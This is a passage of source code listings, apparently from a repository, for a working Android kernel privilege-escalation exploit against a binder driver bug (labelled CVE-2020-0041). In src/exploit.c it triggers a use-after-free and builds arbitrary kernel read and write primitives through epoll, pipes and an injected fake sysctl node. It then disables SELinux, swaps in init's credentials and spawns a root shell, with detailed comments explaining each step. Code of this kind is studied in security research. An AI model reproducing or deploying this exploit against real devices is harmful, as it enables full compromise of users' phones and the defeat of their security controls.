		perror("pthread_barrier_init");
		return false;
	}

	handle->next = NULL;
	handle->stack = malloc(65536);
	handle->name = strdup(endpoint_name);
	handle->status = 0;
	handle->pid = clone(endpoint_thread, handle->stack + 65536, CLONE_VM|SIGCHLD, handle);


	/* Wait on the barrier for the endpoint creation to be complete. */
	pthread_barrier_wait(&handle->barrier);

	if (handle->status < 0) {
		int status;
		waitpid(handle->pid, &status, NULL);
		endpoint_handle_free(handle);
		return false;
	}

	/* Insert the endpoint in the linked list. */
	if (!endpoints)
		endpoints = handle;
	else {
		struct endpoint_handle *tmp = endpoints;
		while (tmp->next != NULL)
			tmp = tmp->next;
		/* Insert. */
		tmp->next = handle;
	}

	return true;
}

bool terminate_endpoint(const char *endpoint_name)
{
	struct endpoint_handle *handle = _lookup_by_name(endpoint_name);
	int status;

	if (!handle) {
		log_err("[-] No endpoint named: '%s'\n", endpoint_name);
		exit(1);
		return false;
	}
	kill(handle->pid, SIGKILL);
	waitpid(handle->pid, &status, 0);

	endpoint_handle_free(handle);

	return true;
}

struct endpoint_handle *get_endpoints()
{
   return endpoints;
}


```

`src/exploit.c`:

```c
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <poll.h>
#include <sys/epoll.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/ashmem.h>
#include <linux/fs.h>

#include "node.h"
#include "exploit.h"
#include "handle.h"
#include "binder.h"
#include "log.h"
#include "endpoint.h"
#include "pending_node.h"

#define BINDER_BUFFER_SZ	128 * 1024
#define RESERVED_BUFFER_SZ	127 * 1024

#define KERNEL_MAGIC    (unsigned long)0x644d5241

#define SELINUX_ENFORCING_OFFSET 0x2ba4000
#define MEMSTART_ADDR_OFFSET 0x20d1090
#define SYSCTL_TABLE_ROOT_OFFSET 0x29da3f8
#define PROC_DOUINTVEC_OFFSET 0x196775c
#define INIT_TASK_OFFSET 0x29a1e80L
#define INIT_CRED_OFFSET 0x29b00a0
#define OFFSET_PIPE_FOP 0x1f2f650

#define TASKS_OFFSET 0x570
#define PID_OFFSET 0x670
#define MM_OFFSET 0x5c0
#define REAL_CRED_OFFSET 0x838

char pathname[64];


uint64_t reserved_buffer_sz = 0;
uint64_t memstart_addr = 0;
uint64_t kernel_base = 0;

/*
 * Convert physical address to kernel virtual address.
 */

uint64_t phys_to_virt(uint64_t phys)
{
   return (phys - memstart_addr) | 0xFFFFFFC000000000;
}

/*
 * Trigger the bug, and free pending node, on which we still have
 * a reference. This will be the primitive for all the exploitation.
 */
void dec_node(struct binder_state *bs, uint64_t target, uint64_t vma_start, bool strong, bool second)
{

   struct binder_transaction_data_sg sg;
   struct binder_transaction_data *td;
   struct binder_write_read bwr;

   uint64_t handle = 0; /* It *SHOULD* be 0 as it's the value from ref created from the ctx mgr node. */

   /* Send a big buffer. */

   uint32_t tr_size = reserved_buffer_sz; // Use a query size of 0x20000 (we subtract 0x10 for the secctx)
   uint8_t data[BINDER_BUFFER_SZ];
   uint64_t offsets[128];
   uint8_t sg_buf[0x1000];
   uint32_t readbuf[32];
   uint8_t *ptr = data;
   uint64_t *offs = offsets;
   uint8_t buf[0x100];
   uint32_t buflen = 0;


   /*
   * Used to perform BC_TRANSACTION_SG queries.
   */
   struct {
      uint32_t cmd;
      struct binder_transaction_data txn;
      binder_size_t buffers_size;
   } __attribute__((packed)) writebuf;

   *(uint64_t *)(data + 0xe8) = 0x40; // offset of valid BINDER_TYPE_PTR
   /* The purpose of this apparently useless transaction is to initialize the content of the qword at
   * offset 0xf0 from the beginning of the transaction buffer of the servicemanager.
   * I used a transaction size of 0x20000 to be sure to retrieve the whole buffer for myself, and this way 
   * be sure to be serviced the very beginning of the transaction buffer.
   */
   // the transaction won't make it through as it will fail trying to copy from a NULL userland pointer
   binder_transaction(bs, false, target, data, tr_size, NULL, 1); 


   /* Wait for the BR_FAILED_REPLY. */
   uint32_t remaining = 0, consumed = 0;
   while (binder_read_next(bs, data, &remaining, &consumed) != BR_FAILED_REPLY);

   memset(buf, 0, 0x100);
   memset(offsets, 0, 128 * sizeof(uint64_t));

   /* From here it gets a little bit messy / crafty. */

   /*
   * Create the first object valid object, which will be smashed after the bug has been successfully triggered.
   */
   struct flat_binder_object *fbo = (struct flat_binder_object *)ptr;
   fbo->hdr.type = strong ? BINDER_TYPE_HANDLE : BINDER_TYPE_WEAK_HANDLE;
   fbo->flags = 0;
   fbo->handle = target;
   fbo->cookie = 0;
   *(offs++) = ((uint8_t *)fbo) - data;
   ptr = ++fbo;


   /*
   * Here, we craft a BINDER_TYPE_PTR, which won't be added to the offset array, and will thus not be validated by the binder
   * driver. It will be used later, once the bug is triggered, and we can make the `parent` pointer, point to this object.
   * As it wasn't validated we can't assign it an arbitrary length. The sole purpose of this object is to use the
   * binder parent fixup code to overwrite a qword at an "arbitrary" offset with the userland address of a child buffer.
   * This is the primitive which is used to overwrite the handle value of the BINDER_TYPE_HANDLE we created above.
   */
   struct binder_buffer_object *bbo = (struct binder_buffer_object *)(ptr);         //For now, we assume the fd will be 4
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = 0;
   bbo->buffer = vma_start; /* This *MUST* be the address of the beginning of the userland mapping of /dev/binder. */
   bbo->length = 0xdeadbeefbadc0ded;
   bbo->parent = 0;
   bbo->parent_offset = 0;
   ptr = ++bbo;

   /* This one is the official one. */
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = 0;
   bbo->buffer = sg_buf;
   bbo->length = 0x10;
   bbo->parent = 0;
   bbo->parent_offset = 0;

   // Add it to the offsets array
   *(offs++) = ((uint8_t *)bbo) - data;
   ptr = ++bbo;

   /* We create an additionnal BINDER_TYPE_PTR, whose parent will be the one we created just above. This is where the bug is triggered,
   * as the bbo->parent index is set to 6 which is wrong as it is > to the number of offsets in the offsets array. offs[6] will thus end up pointing in
   * not yet initalized data reserved for the sg_buf. The whole purpose of the seemingly useless first transaction was to initialize this address with the 
   * value 0x40, which is the offset of the previous BINDER_TYPE_PTR object in order for the `binder_validate_ptr` and `binder_valid_fixup` function to succeed.
   * This BINDER_TYPE_PTR is then eventually validated and the `last_fixup_obj_off` is set to the offset of this object.
   * This implies that we just validated a BINDER_TYPE_PTR whose bbo->parent index points into an array entry which will be modified by the next BINDER_TYPE_PTR below,
   * that the driver will process.
   */
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
   bbo->buffer = NULL;
   bbo->length = 0;
   bbo->parent = 6;
   bbo->parent_offset = 0;
   buflen += bbo->length;

   // Add it to the offsets array
   *(offs++) = ((uint8_t *)bbo) - data;
   ptr = ++bbo;

   /* 
   * And finally, the last nail in the coffin.
   * We craft the almost exact same BINDER_TYPE_PTR as above, still having a parent index of 6. This time however, we specific a 'buffer', whose data will be copied from
   * before validating the BINDER_TYPE_PTR. This qword will overwrite the value at offs[6], replacing the value 0x40 pointing to a validated BINDER_TYPE_PTR, with the value 0x18,
   * which points to the very first BINDER_TYPE_PTR, which wasn't validated by the binder driver as we haven't added it's offset to the offsets array. The following will now happen
   * in `binder_fixup_parent()`:
   * ```c
   2884         parent = binder_validate_ptr(target_proc, b, &object, bp->parent,
   2885                                      off_start_offset, &parent_offset,
   2886                                      num_valid);
   ...
   2893         if (!binder_validate_fixup(target_proc, b, off_start_offset,
   2894                                    parent_offset, bp->parent_offset,
   2895                                    last_fixup_obj_off,
   2896                                    last_fixup_min_off)) {
   2897                 binder_user_error("%d:%d got transaction with out-of-order buffer fixup\n",
   2898                                   proc->pid, thread->pid);
   2899                 return -EINVAL;
   2900         }
   * ```
   * Here, parent will now point to the unvalidated BINDER_TYPE_PTR, however, to be used by the driver it needs to be validated by the `binder_validate_fixup()` function:
   * ```c
   * 2414 static bool binder_validate_fixup(struct binder_proc *proc,
   2415                                   struct binder_buffer *b,
   2416                                   binder_size_t objects_start_offset,
   2417                                   binder_size_t buffer_obj_offset,
   2418                                   binder_size_t fixup_offset,
   2419                                   binder_size_t last_obj_offset,
   2420                                   binder_size_t last_min_offset)
   2421 {
   ...
   2427         while (last_obj_offset != buffer_obj_offset) {
   2428                 unsigned long buffer_offset;
   2429                 struct binder_object last_object;
   2430                 struct binder_buffer_object *last_bbo;
   2431                 size_t object_size = binder_get_object(proc, b, last_obj_offset,
   2432                                                        &last_object);
   2433                 if (object_size != sizeof(*last_bbo))
   2434                         return false;
   2435
   2436                 last_bbo = &last_object.bbo;
   2437                 *
   2438                 * Safe to retrieve the parent of last_obj, since it
   2439                 * was already previously verified by the driver.
   2440                 *
   2441                 if ((last_bbo->flags & BINDER_BUFFER_FLAG_HAS_PARENT) == 0)
   2442                         return false;
   2443                 last_min_offset = last_bbo->parent_offset + sizeof(uintptr_t);
   2444                 buffer_offset = objects_start_offset +
   2445                         sizeof(binder_size_t) * last_bbo->parent,
   2446                 binder_alloc_copy_from_buffer(&proc->alloc, &last_obj_offset,
   2447                                               b, buffer_offset,
   2448                                               sizeof(last_obj_offset));
   2449         }
   2450         return (fixup_offset >= last_min_offset);
   2451 }
   ```
   Here, as the `last_bbo` pointer was previously validated by the driver, it is trusted, and it particular, its `parent` field is trusted. However, the value of
   last_bbo->parent is now `0x18` instead of `0x40`, which ends up setting `last_obj_offset` to the same value as `buffer_obj_offset` (which is the offset of the
   fake BINDER_TYPE_PTR), and exists the loop. From now on, the driver will be manipulating and unvalidated object. The following code will try to fixup the buffer address
   in the fake BINDER_TYPE_PTR object:
   ```c
   2909         buffer_offset = bp->parent_offset +
   2910                         (uintptr_t)parent->buffer - (uintptr_t)b->user_data;
   2911         binder_alloc_copy_to_buffer(&target_proc->alloc, b, buffer_offset,
   2912                                     &bp->buffer, sizeof(bp->buffer));
   ```
   As the parent->buffer is equal to b->user_data, only the parent_offset which is 8, is taken into account. This means that the userland address of the
   bp->buffer will be copied at the offset 8 from the beginning of the binder buffer, which happens to be the offset of the node value of the BINDER_TYPE_HANDLE 
   (which has meanwhile been transformed into a BINDER_TYPE_BINDER by the binder driver) object we added at the beginning of the transaction. When eventually entering
   the binder_transaction_buffer_release() function, the driver will fail trying to decrement the invalid node.
   */
   uint64_t new_off = 0x18;
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
   bbo->buffer = &new_off;
   bbo->length = sizeof(new_off);
   bbo->parent = 0x6; // offs[6] = 0x18;
   bbo->parent_offset = 0x8 + ((second == true) ? 4 : 0);
   *(offs++) = ((uint8_t *)bbo) - data;
   ptr = ++bbo;

   /* Send the BC_TRANSACTION_SG transaction. */
   writebuf.cmd = BC_TRANSACTION_SG;
   //writebuf.txn.target.handle = 0; // Ctxt mgr
   writebuf.txn.target.handle = target; // endpoint
   writebuf.txn.code = TRIGGER_DECREF;
   writebuf.txn.flags = 0;
   writebuf.txn.data_size = ((uint8_t*)ptr) - ((uint8_t *)data);
   writebuf.txn.offsets_size = ((uint8_t*)offs) - ((uint8_t *)offsets);
   writebuf.txn.data.ptr.buffer = data;
   writebuf.txn.data.ptr.offsets = offsets;
   buflen = tr_size - writebuf.txn.data_size - writebuf.txn.offsets_size;
   writebuf.buffers_size = buflen;

   bwr.write_size = sizeof(writebuf);
   bwr.write_consumed = 0;
   bwr.write_buffer = &writebuf;
   bwr.read_size = 0;
   bwr.read_consumed = 0;
   bwr.read_buffer = 0;

   /* Send bogus query. */
   ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

   /* Wait for the reply and free. */
   remaining = 0, consumed = 0;
   while (binder_read_next(bs, data, &remaining, &consumed) != BR_REPLY);

   /* Free the transaction buffer. */
   td = (struct binder_transaction_data *)(data + consumed - sizeof(*td));
   /* Free buffer. */
   binder_free_buffer(bs, td->data.ptr.buffer);
}


/*
 * Do all the preparation for the exploitation, that is setup up a number of pending nodes
 * on the soon to be dangling `binder_node`. I used multiple pending nodes as I need to leak values
 * multiple times in order to disclose the kernel address of the dangling `binder_node`, and know
 * where I add controlled kernel data in order to bypass PAN.
 */
uint64_t setup_pending_nodes(struct binder_state *bs, uint64_t endpoint_handle, pthread_t *th, uint32_t n1, uint32_t n2)
{
	struct binder_transaction_data *tr;
	uint8_t txn_data[BINDER_BUFFER_SZ];
	uint8_t rdata[512];
	uint64_t uaf_node = 0, uaf_node2 = 0;
	uint32_t remaining = 0, consumed = 0;
	struct binder_transaction_data *t = (struct binder_transaction_data *)(rdata + sizeof(uint32_t));

	struct binder_io msg, reply;

	/* Free the reserved buffer. As we are supposed to only perform
	 * transaction up to this size, which won't require creating pending nodes
	 * it should be alright.
	 */
	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	/* Free the reserved buffer. */
	if (binder_call(bs, &msg, &reply, endpoint_handle, FREE_RESERVED_BUFFER) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}
	binder_free_buffer(bs, reply.data0);

	
	/* Compute the reserved buffer size, and ask the endpoint to reserve it. */
	reserved_buffer_sz = RESERVED_BUFFER_SZ - (n1 + n2) * 0x10;
	make_transaction(rdata, false, endpoint_handle, txn_data, reserved_buffer_sz, NULL, 0);
	t->code = RESERVE_BUFFER;
	/* Make the call. */
	binder_write(bs, rdata, sizeof(*t) + sizeof(uint32_t));

	/* Wait for the BR_TRANSACTION_COMPLETE. */
	while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_REPLY);
	/* Free the transaction. */
	tr = ((uint8_t*)rdata + consumed - sizeof(*tr));
	binder_free_buffer(bs, tr->data.ptr.buffer);

	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	/* Retrieve the vma_start address of the endpoint. */
	if (binder_call(bs, &msg, &reply, endpoint_handle, GET_VMA_START) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}

	uint64_t vma_start = bio_get_uint32(&reply) + (((uint64_t)bio_get_uint32(&reply)) << 32);
	binder_free_buffer(bs, reply.data0);

	/* Now, we exchange handle, so as to create the vulnerable node, and for the endpoint
	 * to be able to reach back to us.
	 */
	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	bio_put_obj(&msg, 0x4141); //Add arbitrary node value
	if (binder_call(bs, &msg, &reply, endpoint_handle, EXCHANGE_HANDLES) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}

	/* The endpoint should have created a ref to the uaf node. */
	uaf_node = bio_get_ref(&reply);
	if (!uaf_node) {
		log_err("[-] Failed to grab a reference to the UAF node.\n");
		exit(1);
	}

	/* Take a reference to the node. */
	binder_acquire(bs, uaf_node);

	uaf_node2 = bio_get_ref(&reply);
	if (!uaf_node2) {
		log_err("[-] Failed to grab a reference to the UAF node.\n");
		exit(1);
	}

	/* Take a reference to the node. */
	binder_acquire(bs, uaf_node2);


	/* Free the buffer. */
	binder_free_buffer(bs, reply.data0);

	int i;
	pthread_t node_th;

	for (i = 0; i < n1; i++) {
		/* Create the first pending node. */
		node_th = pending_node_create(bs, uaf_node);

		if (th)
			th[i] = node_th;
	}

	int j;
	for (j = 0; j < n2; j++) {
		node_th = pending_node_create(bs, uaf_node2);
		if (th)
			th[i + j] = node_th;
	}

	/* Now that we have a pending node, we can release our reference to it. */
	binder_release(bs, uaf_node);
	binder_release(bs, uaf_node2);

	/* Free the reserved buffer. As we are supposed to only perform
	 * transaction up to this size, which won't require creating pending nodes
	 * it should be alright.
	 */
	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	/* Free the reserved buffer. */
	if (binder_call(bs, &msg, &reply, endpoint_handle, FREE_RESERVED_BUFFER) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}
	binder_free_buffer(bs, reply.data0);

	/* return the vulnerable node reference to the caller. */
	return vma_start;
}

/*
 * Read SELinux enforcing through selinuxfs.
 */
char read_selinux_enforcing() {
   int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
   char enforcing;
   read(fd, &enforcing, 1);
   close(fd);
   return enforcing;
}

struct exp_node * file;
int pipes[2];

/*
 * 32-bit kernel read primitive using corrupted f_inode, such that 
 * epitem.event.data overlaps with f_inode->i_sb.
 */

uint64_t read32(uint64_t addr) {
   struct epoll_event evt;
   evt.events = 0;
   evt.data.u64 = addr - 24;
   int err = epoll_ctl(file->ep_fd, EPOLL_CTL_MOD, pipes[0], &evt);
   uint32_t test = 0xdeadbeef;
   ioctl(pipes[0], FIGETBSZ, &test);
   return test;
}

/*
 * 64-bit kernel read primitive using read32
 */

uint64_t read64(uint64_t addr) {
   uint32_t lo = read32(addr);
   uint32_t hi = read32(addr+4);

   return (((uint64_t)hi) << 32) | lo;
}

void *ctl_table_uaddr;

/*
 * 64-bit kernel write primitive using fake proc sysctl entry.
 */
void write64(uint64_t addr, uint64_t value) {
   *(uint64_t *)(ctl_table_uaddr + 8) = addr;          // data == what to read/write
   *(uint32_t *)(ctl_table_uaddr + 16) = 0x8;

   char buf[100];
   int fd = open(pathname, O_WRONLY);
   if (fd < 0) {
      printf("[!] Failed to open. Errno: %d\n", errno);
   }

   sprintf(buf, "%u %u\n", (uint32_t)value, (uint32_t)(value >> 32));
   int ret = write(fd, buf, strlen(buf));
   if (ret < 0)
      printf("[!] Failed to write, errno: %d\n", errno);
   close(fd); 
}

/*
 * 32-bit kernel write primitive using fake proc sysctl entry.
 */
void write32(uint64_t addr, uint32_t value) {
   *(uint64_t *)(ctl_table_uaddr + 8) = addr;          // data == what to read/write
   *(uint32_t *)(ctl_table_uaddr + 16) = 4;

   char buf[100];
   int fd = open(pathname, O_WRONLY);
   sprintf(buf, "%u\n", value);
   write(fd, buf, strlen(buf));
   close(fd);
}

/*
 * Find task given its PID, starting at task start.
 */
uint64_t get_task_by_pid(uint64_t start, int pid) {
   uint64_t task = read64(start + TASKS_OFFSET + 8) - TASKS_OFFSET;

   while (task != start) {
      if (read32(task + PID_OFFSET) == pid) {
         return task;
      }

      /* Go to prev */
      task = read64(task + TASKS_OFFSET + 8) - TASKS_OFFSET;
   }

   return 0;
}


/*
 * pwn!
 */
int main()
{
   int res = -1;
   uint64_t A, B;


   void *map = mmap(2<<20, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
   log_info("[+] Mapped %lx\n", map);

   /* We'll use one of these pipes for leaking its address and corrupting f_inode. */
   pipe(&pipes[0]);

   pin_cpu(0);
   
   log_info("[+] selinux_enforcing before exploit: %c\n", read_selinux_enforcing());

	struct binder_state *bs = binder_open(BINDER_DEVICE, 128 * 1024); 
	if (!bs) {
		log_err("[-] Failed to open /dev/binder.\n");
		exit(1);
	}

   /* Spawn the threads used for reallocating the dangling `binder_node` with controlled data. */
	spawn_realloc_threads();

   /* Step 1: leak a pipe file address */

   file = node_new("leak_file");

   /* Only works on file implementing the 'epoll' function. */
   while (!node_realloc_epitem(file, pipes[0]))
      node_reset(file);

   uint64_t file_addr = file->file_addr;
   log_info("[+] pipe file: 0x%lx\n", file_addr);


   /* Step 2: leak epitem address */
   struct exp_node *epitem_node = node_new("epitem");
   while (!node_kaddr_disclose(file, epitem_node))
      node_reset(epitem_node);

   printf("[*] file epitem at %lx\n", file->kaddr);

   /* 
    * Alright, now we want to do a write8 to set file->f_inode.
    * Given the unlink primitive, we'll set file->f_inode = epitem + 80
    * and epitem + 88 = &file->f_inode.
    * 
    * With this we can change f_inode->i_sb by modifying the epitem data, 
    * and get an arbitrary read through ioctl.
    *
    * This is corrupting the fllink, so we better don't touch anything there!
    */

   struct exp_node *write8_inode = node_new("write8_inode");
   node_write8(write8_inode, file->kaddr + 120 - 40 , file_addr + 0x20);

   printf("[*] Write done, should have arbitrary read now.\n");
   uint64_t fop = read64(file_addr + 0x28);
   printf("[+] file operations: %lx\n", fop);

   kernel_base = fop - OFFSET_PIPE_FOP;
   printf("[+] kernel base: %lx\n", kernel_base);

   /* Just a basic check */
   if (read64(kernel_base + 0x38) != KERNEL_MAGIC) {
      printf("[*] Something went wrong with arbitrary read setup!?\n");
      goto out;
   }

   /* Step 3: Disable selinux by writing NULL to selinux_enforcing */
   struct exp_node *write8_selinux = node_new("write8_selinux");
   node_write_null(write8_selinux, kernel_base + SELINUX_ENFORCING_OFFSET);

   /* 
    * Step 4: Setup a fake sysctl node in our own userland page. We will start
    * by locating the kernel address of this page by parsing our own pgd.
    */

   uint64_t init_task = kernel_base + INIT_TASK_OFFSET;
   uint64_t init_cred = read64(init_task + REAL_CRED_OFFSET);
   printf("[*] init_cred: %lx\n", init_cred);


   uint64_t current = get_task_by_pid(init_task, getpid());
   if (current == 0) {
      printf("[*] Failed to find ourselves...\n");
      goto out;
   }

   /* Now resolve our mapping at 2MB. But first read memstart_addr so we can do phys_to_virt() */

   memstart_addr = read64(kernel_base + MEMSTART_ADDR_OFFSET);
   printf("[+] memstart_addr: 0x%lx\n", memstart_addr);
   uint64_t mm = read64(current + MM_OFFSET);
   uint64_t pgd = read64(mm + 0x40);
   uint64_t entry = read64(pgd);

   uint64_t next_tbl = phys_to_virt(((entry & 0xffffffffffff)>>12)<< 12);
   printf("[+] First level entry: %lx -> next table at %lx\n", entry, next_tbl);

   /* Offset 8 for 2MB boundary */
   entry = read64(next_tbl + 8);
   next_tbl = phys_to_virt(((entry & 0xffffffffffff)>>12)<< 12);
   printf("[+] Second level entry: %lx -> next table at %lx\n", entry, next_tbl);

   entry = read64(next_tbl);
   uint64_t kaddr = phys_to_virt(((entry & 0xffffffffffff)>>12)<< 12);


   *(uint64_t *)map = 0xdeadbeefbadc0ded;
   if ( read64(kaddr) != 0xdeadbeefbadc0ded) {
      printf("[!] Something went wrong resolving the address of our mapping\n");
      goto out;
   }


   /* Now we can prepare our magic sysctl node as s child of the left-most node */

   uint64_t sysctl_table_root = kernel_base + SYSCTL_TABLE_ROOT_OFFSET;
   printf("[+] sysctl_table_root = %lx\n", sysctl_table_root);
   uint64_t ctl_dir = sysctl_table_root + 8;

   uint64_t node = read64(ctl_dir + 80);
   uint64_t prev_node;
   while (node != 0) {
      prev_node = node;
      node = read64(node + 0x10); 
   }

   /* We found the insertion place, setup the node */

   uint64_t node_kaddr = kaddr;
   void *node_uaddr = map;

   uint64_t tbl_header_kaddr = kaddr + 0x80;
   void *tbl_header_uaddr = map + 0x80;

   uint64_t ctl_table_kaddr = kaddr + 0x100;
   ctl_table_uaddr = map + 0x100;

   uint64_t procname_kaddr = kaddr + 0x200;
   void * procname_uaddr = map + 0x200;

   /* Setup rb_node */
   *(uint64_t *)(node_uaddr + 0x00) = prev_node;              // parent = prev_node
   *(uint64_t *)(node_uaddr + 0x08) = 0;                      // right = null
   *(uint64_t *)(node_uaddr + 0x10) = 0;                      // left = null

   *(uint64_t *)(node_uaddr + 0x18) = tbl_header_kaddr;       // my_tbl_header

   *(uint64_t *)(tbl_header_uaddr) = ctl_table_kaddr;
   *(uint64_t *)(tbl_header_uaddr + 0x18) = 0;                // unregistering
   *(uint64_t *)(tbl_header_uaddr + 0x20) = 0;                // ctl_table_arg
   *(uint64_t *)(tbl_header_uaddr + 0x28) = sysctl_table_root;      // root
   *(uint64_t *)(tbl_header_uaddr + 0x30) = sysctl_table_root;      // set
   *(uint64_t *)(tbl_header_uaddr + 0x38) = sysctl_table_root + 8;  // parent
   *(uint64_t *)(tbl_header_uaddr + 0x40) = node_kaddr;          // node
   *(uint64_t *)(tbl_header_uaddr + 0x48) = 0;                // inodes.first

   /* Now setup ctl_table */
   uint64_t proc_douintvec = kernel_base + PROC_DOUINTVEC_OFFSET;
   *(uint64_t *)(ctl_table_uaddr) = procname_kaddr;           // procname
   *(uint64_t *)(ctl_table_uaddr + 8) = kernel_base;          // data == what to read/write
   *(uint32_t *)(ctl_table_uaddr + 16) = 0x8;
   *(uint64_t *)(ctl_table_uaddr + 0x20) = proc_douintvec;       // proc_handler
   *(uint32_t *)(ctl_table_uaddr + 20) = 0666;             // mode = rw-rw-rw-

   /*
    * Compute and write the node name. We use a random name starting with aaa
    * for two reasons:
    *
    *  - Must be the first node in the tree alphabetically given where we insert it (hence aaa...)
    *
    *  - If we already run, there's a cached dentry for each name we used earlier which has dangling 
    *    pointers but is only reachable through path lookup. If we'd reuse the name, we'd crash using 
    *    this dangling pointer at open time.
    *
    * It's easier to have a unique enough name instead of figuring out how to clear the cache,
    * which would be the cleaner solution here.
    */

   int fd = open("/dev/urandom", O_RDONLY);
   uint32_t rnd;
   read(fd, &rnd, sizeof(rnd));

   sprintf(procname_uaddr, "aaa_%x", rnd);
   sprintf(pathname, "/proc/sys/%s", procname_uaddr);

   /* And finally use a write8 to inject this new sysctl node */
   struct exp_node *write8_sysctl = node_new("write8_sysctl");
   node_write8(write8_sysctl, kaddr, prev_node + 16);

   /* Since our write is mirrored, let's clear the unwanted side-effect right away */
   *(uint64_t *)(map + 8) = 0;

   printf("[+] Injected sysctl node!\n");
   sleep(1);

   /* Set refcount to 0x100 and set our own credentials to init's */
   write32(init_cred, 0x100);
   write64(current + REAL_CRED_OFFSET, init_cred);
   write64(current + REAL_CRED_OFFSET + 8, init_cred);

   if (getuid() != 0) {
      printf("[!!] Something went wrong, we're not root!!\n");
      goto out;
   }

   /* Step Now we can clean things up. */
   /* Cleanup the `sendmsg()` threads, which hold a reference to the freed 
    * `binder_node`.
    */
   struct exp_node *nodes[] = {write8_inode, write8_selinux, write8_sysctl};
   for (int j = 0; j < 3; j++) {
      printf("[*] Node %s, pid %d, kaddr %lx\n", nodes[j]->name, nodes[j]->tid, nodes[j]->kaddr);
      if (!nodes[j]->tid) {
         printf("[*] Node %s has no thread id? \n", nodes[j]->name);
         continue;
      }
      /* Looking for pointers in the different nodes. */
      uint64_t task = get_task_by_pid(init_task, nodes[j]->tid);
      if (!task) {
         printf("[!] Couldn't find task for pid %d\n", nodes[j]->tid);
         continue;
      }
      uint64_t kstack = read64(task + 0x28);
      
      for (int i = 0; i < 0x4000; i += 8) {
         if (read64(kstack + i) == nodes[j]->kaddr) {
            /* We overwrite with 0x10, as `kfree()` will not complain when encountering it,
             * contrary to the NULL ptr.
             */
            log_info("[*] Replaced sendmmsg dangling reference\n");
            write64(kstack + i, 0x10);
         }
      }

      kill(nodes[j]->tid, SIGKILL);
      waitpid(nodes[j]->tid, NULL, 0);
   }

   log_info("[+] Cleaned up sendmsg threads\n");

   /* Bump up f_count to avoid entering into pipe_release() when exiting the process. */
   write64(file_addr + 0x38, 0xff);

   /* Clear up our fake node */
   write64(prev_node + 16, 0);

   /* We also smashed our epitem, try and restore that ... */
   printf("[*] epitem.next = %lx\n", read64(file->kaddr + 88));
   printf("[*] epitem.prev = %lx\n", read64(file->kaddr + 88 + 8));

   // Just set next = prev, since we should be the only epitem here
   write64(file->kaddr + 88, read64(file->kaddr + 88 + 8));

   /* Free all those pending nodes and threads */
   node_free(file);
   node_free(epitem_node);
   node_free(write8_selinux);
   node_free(write8_inode);
   node_free(write8_sysctl);
   cleanup_realloc_threads();



   /* We can finally enjoy our root shell. */
   log_info("[*] Launching privileged shell\n");
   char *args[] = {"/system/bin/sh", NULL};
   char *envp[] = {"PATH=/sbin:/system/sbin:/product/bin:/apex/com.android.runtime/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin", "ANDROID_DATA=/data", "HOSTNAME=root_by_cve-2020-0041", NULL};
   execve(args[0], args, envp);
   return 0;

out:
   printf("[!] Sleeping forever since it's not safe to exit now...\n");
   while(1) sleep(10);
   return -1;
}
```

`src/helpers.c`:

```c
#define _GNU_SOURCE	1
#include <sched.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <errno.h>

#include "helpers.h"
#include "log.h"


/*
 * Attach to a specific CPU.
 */
bool pin_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);

	if (sched_setaffinity(0, sizeof(set), &set) < 0) {
		log_err("sched_setafinnity(): %s\n", strerror(errno));
		return false;
	} 

	return true;
}

```

`src/log.c`:

```c
#include <stdint.h>
#include <stdarg.h>
#include <unistd.h>
#include <stdio.h>

ssize_t log_info(const char *format, ...)
{
	va_list args;
	ssize_t len = 0;
	uint8_t buf[0x1000];
	memset(buf, 0, 0x1000);
	va_start(args, format);
	len = vsnprintf(buf, INT_MAX, format, args);
	va_end(args);

	if (len > 0)
		write(1, buf, len);
	return len;
}

ssize_t log_err(const char *format, ...)
{
	va_list args;
	ssize_t len = 0;
	uint8_t buf[0x1000];
	memset(buf, 0, 0x1000);
	va_start(args, format);
	len = vsnprintf(buf, INT_MAX, format, args);
	va_end(args);

	if (len > 0)
		write(2, buf, len);
	return len;
}





```

`src/node.c`:

```c
#include <errno.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>

#include "binder.h"
#include "binder_lookup.h"
#include "log.h"
#include "exploit.h"
#include "endpoint.h"
#include "node.h"

/*
 * Create a vulnerable dangling node within the binder transaction.
 */
static struct exp_node *_node_new(struct exp_node *node, const char *name)
{
	struct binder_state *bs = NULL;
	pthread_t *uaf_node_th = NULL;
	//uint32_t num_pending = 0x40;
	uint32_t num_pending = 0x40;
   uint64_t vma_start = 0;
	uint64_t handle = 0;

   if (!node || !name)
      return NULL;

	bs = binder_open(BINDER_DEVICE, 128 * 1024);
	if (!bs) {
		return NULL;
	}

	handle = grab_handle(bs, name);
	if (!handle)
		return NULL;

